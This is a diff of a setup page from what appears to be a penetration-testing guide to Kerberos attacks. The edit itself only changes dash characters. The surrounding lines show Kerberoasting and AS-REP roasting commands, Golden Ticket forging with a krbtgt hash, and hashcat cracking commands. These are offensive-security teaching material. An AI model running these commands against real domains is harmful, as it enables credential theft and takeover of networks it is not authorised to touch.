@@ -1,7 +1,7 @@
 # Tools Setup
 
 Installation and verification of the tools referenced throughout the Attacks section. All Python
-tools are installed with [uv](https://docs.astral.sh/uv/) as isolated tool environments -- no
+tools are installed with [uv](https://docs.astral.sh/uv/) as isolated tool environments - no
 virtual environment management or `pip install` required.
 
 --8<-- "includes/authorized-use.md"
@@ -33,10 +33,10 @@ uv tool install git+https://github.com/StrongWind1/KerbWolf
 
 | Command | Purpose |
 |---------|---------|
-| `kw-roast` | Kerberoasting -- requests TGS-REP tickets and outputs hashcat-compatible hashes |
-| `kw-asrep` | AS-REP roasting -- requests AS-REPs for no-preauth accounts |
-| `kw-extract` | Offline pcap parser -- extracts AS-REQ, AS-REP, and TGS-REP hashes from captures |
-| `kw-tgt` | TGT acquisition -- requests TGTs using passwords, NT hashes, or AES keys (pass-the-key) |
+| `kw-roast` | Kerberoasting - requests TGS-REP tickets and outputs hashcat-compatible hashes |
+| `kw-asrep` | AS-REP roasting - requests AS-REPs for no-preauth accounts |
+| `kw-extract` | Offline pcap parser - extracts AS-REQ, AS-REP, and TGS-REP hashes from captures |
+| `kw-tgt` | TGT acquisition - requests TGTs using passwords, NT hashes, or AES keys (pass-the-key) |
 
 ### Verify
 
@@ -49,7 +49,7 @@ kw-tgt --help
 
 ### Basic Usage
 
-```bash title="kerbwolf — Kerberoast, AS-REP roast, extract from pcap, and request TGT"
+```bash title="kerbwolf - Kerberoast, AS-REP roast, extract from pcap, and request TGT"
 # Kerberoast all accounts with SPNs
 kw-roast -d CORP.LOCAL --dc-ip 192.0.2.10 -u user -p '<password>' -o hashes.txt
 
@@ -106,7 +106,7 @@ ticketer.py --help
 
 ### Basic Usage
 
-```bash title="impacket — get TGT, get service ticket, describe ticket, forge Golden Ticket"
+```bash title="impacket - get TGT, get service ticket, describe ticket, forge Golden Ticket"
 # Get a TGT
 getTGT.py 'CORP.LOCAL/user:<password>' -dc-ip 192.0.2.10
 
@@ -177,7 +177,7 @@ ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL ad
 | AES128 (17) | 19800 | `hashcat -m 19800 hashes.txt wordlist.txt` |
 | AES256 (18) | 19900 | `hashcat -m 19900 hashes.txt wordlist.txt` |
 
-```bash title="hashcat — wordlist + rules, then brute-force short passwords"
+```bash title="hashcat - wordlist + rules, then brute-force short passwords"
 # Wordlist + rules (best starting point for all modes)
 hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
 
